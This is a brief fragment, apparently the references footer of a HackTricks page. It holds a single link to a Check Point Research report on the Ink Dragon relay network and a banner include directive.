 - [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
 
 {{#include ../../banners/hacktricks-training.md}}
